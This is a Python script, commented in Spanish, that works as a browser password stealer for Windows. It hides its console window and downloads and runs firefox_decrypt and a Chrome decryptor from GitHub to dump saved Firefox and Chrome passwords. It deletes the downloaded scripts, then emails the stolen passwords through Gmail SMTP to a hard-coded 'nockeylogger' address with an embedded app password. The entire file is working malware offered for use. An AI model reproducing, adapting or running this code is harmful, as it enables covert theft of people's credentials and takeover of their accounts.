#!/usr/bin/env python3
# coding: cp850

import subprocess 
import smtplib
import os
import sys
import requests
import tempfile
import ctypes
from email.mime.text import MIMEText
 
 
 
 
def hide_console(): # Creamos la función hide_console donde gestionaremos la lógica para ocultar el script
  if sys.platform == "win32":
    ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0) 
    
    

def run_command(command): # Creamos la función run_command donde gestionaremos la lógica para ejecutar comandos 
    try:
        output_command= subprocess.check_output(command,shell=True) # Guardamos el output del comando en una variable
        return output_command.decode("cp850").strip() if output_command else None # Si hemos conseguido un output retornamos el output descifrando en cp850
    except Exception as e:
        print(f"\n[!] Error al ejecutar el comando {command}. Err: {e}")
        return None
def send_email(subject,body,sender,recipients,password): # Creamos la función send_email donde gestionaremos la lógica para mandar el email
    msg=MIMEText(body)
    msg['Subject'] = subject
    msg['From']= sender
    msg['To']= ', '.join(recipients)

    with smtplib.SMTP_SSL('smtp.gmail.com', 465) as smtp_server:
        smtp_server.login(sender,password)
        smtp_server.sendmail(sender,recipients,msg.as_string())   


def get_firefox_profiles(username): # Creamos la función get_firefox_profiles donde gestionaremos la lógica para descubrir perfiles de firefox
    path= f"C:\\Users\\{username}\\AppData\\Roaming\\Mozilla\\Firefox\\Profiles" # Creamos una variable con la ruta donde se ecuentran los perfiles de firefox
    try:
        profiles= [profile for profile in os.listdir(path) if "release" in profile] # Iteramos por cada elemento de la lista creada os.listdir(path), la cual muestra los directorios que existen en esa ruta y almacenamos el elemento que contenga la palabra release
        return profiles[0] if profiles else None # Si hemos encontrado esa carpeta la retornamos
    except Exception as e:
        print(f"\n[!] No ha sido posible obtener los profiles de Firefox\n")
        return None

def get_firefox_passwords(username,profile): # Creamos la función get_firefox_passwords donde gestionaremos la lógica para llamar al script firefox_decrypt.py
    r = requests.get("https://raw.githubusercontent.com/unode/firefox_decrypt/refs/heads/main/firefox_decrypt.py") # Almacenamos el contenido del script en una variable
    temp_dir = tempfile.mkdtemp() # Creamos un directorio temporal
    os.chdir(temp_dir) # Nos metemos en el directorio temporal
    
    with open("firefox_decrypt.py", "wb") as f: 
        f.write(r.content) # Creamos el archivo firefox_decrypt.py con el contenido de https://raw.githubusercontent.com/unode/firefox_decrypt/refs/heads/main/firefox_decrypt.py
    
    p= requests.get("https://raw.githubusercontent.com/Riieiro/GoogleChromeDescrypt/refs/heads/main/google_descrypt.py")
    with open("google_descrypt.py", "wb") as f: 
        f.write(p.content)

    
    command=f"python firefox_decrypt.py C:\\Users\\{username}\\AppData\\Roaming\\Mozilla\\Firefox\\Profiles\\{profile}" # Almacenamos en una variable el comando para ejecutar el script firefox_decrypt.py
    passwords= run_command(command) # Almacenamos en una variable el output del comando ejecutado
    command2= "python google_descrypt.py"
    passwordsg=run_command(command2)

    passwords= passwords + passwordsg
    os.remove("firefox_decrypt.py") # Borramos el archivo firefox_decrypt.py
    os.remove("google_descrypt.py")
    return passwords # Retornamos el output


if __name__=='__main__':
    hide_console() # Llamamos a la función hide_console para ocultar el programa nada más ejecutarlo
    username_str = run_command("whoami") # Almacenamos en una variable el comando whoami
    username = username_str.split("\\")[1]  # Como el output se ve de esta forma desktop-v9f3iid\madrid necesitamos filtrar por madrid
    profiles = get_firefox_profiles(username)  # Le pasamos la variable username a la función get_firefox_profiles
    
    
    if not username or not profiles: # Si no podemos obtener el usuario o el perfil
        print(f"\n[!] No ha sido posible obtener el nombre de usuario o perfiles válidos para Firefox")
        sys.exit(1)

    passwords = get_firefox_passwords(username,profiles) # Almacenamos en una variable las contraseñas retornadas de la función get_firefox_passwords
    if passwords: # Si passwords tiene contenido
        send_email("Data Report", passwords, "nockeylogger@gmail.com", ["nockeylogger@gmail.com"], "ezro xvah ctgy qhlt") # Mandamos el email llamando a la función send_email
    else: 
        print(f"\n[!] No se han encontrado contraseñas")